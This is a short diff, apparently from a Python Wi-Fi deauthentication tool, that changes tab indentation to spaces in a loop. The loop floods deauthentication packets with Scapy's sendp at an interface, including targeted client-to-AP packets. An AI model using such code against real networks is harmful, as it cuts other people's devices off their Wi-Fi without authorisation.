@@ -52,8 +52,8 @@ class Deauth:
         print '> '
         while count != 0:
             for i in range(64):
-				sendp(pkt, iface = self.iface)
-				if client != 'FF:FF:FF:FF:FF:FF':
+                sendp(pkt, iface = self.iface)
+                if client != 'FF:FF:FF:FF:FF:FF':
                     sendp(client_2_ap_pkt, iface = self.iface)
                 count -= 1
 
